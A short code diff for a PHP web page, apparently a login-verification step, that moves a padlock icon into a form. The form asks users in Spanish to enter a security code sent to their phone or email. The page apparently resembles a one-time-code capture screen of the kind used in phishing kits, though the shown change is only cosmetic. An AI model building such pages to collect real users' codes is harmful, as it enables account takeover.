@@ -91,16 +91,13 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         <img width="120px" src="img/lk.svg" alt="">
     </div>
 
-    <div class="masa3">
-        <center>
-            <svg xmlns="http://www.w3.org/2000/svg" width="62" height="62" viewBox="0 0 24 24" fill="none" stroke="#FF7500" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" style="margin-top:6px"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/><circle cx="12" cy="16" r="1.2" fill="#FF7500" stroke="none"/></svg>
-        </center>
-    </div>
+    <div class="masa3"></div>
 
     <div style="padding: 5px;">
         <center>
             <form method="post" style="width: 350px; margin-left: -10px;">
                 <br>
+                <center><svg xmlns="http://www.w3.org/2000/svg" width="62" height="62" viewBox="0 0 24 24" fill="none" stroke="#FF7500" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" style="margin-bottom:10px"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/><circle cx="12" cy="16" r="1.2" fill="#FF7500" stroke="none"/></svg></center>
                 <p style="font-family: sans-serif; color: rgb(105, 105, 105);">
                     Hemos enviado un código de seguridad al número de teléfono o correo electrónico registrado, ingrésalo para continuar.
                 </p>
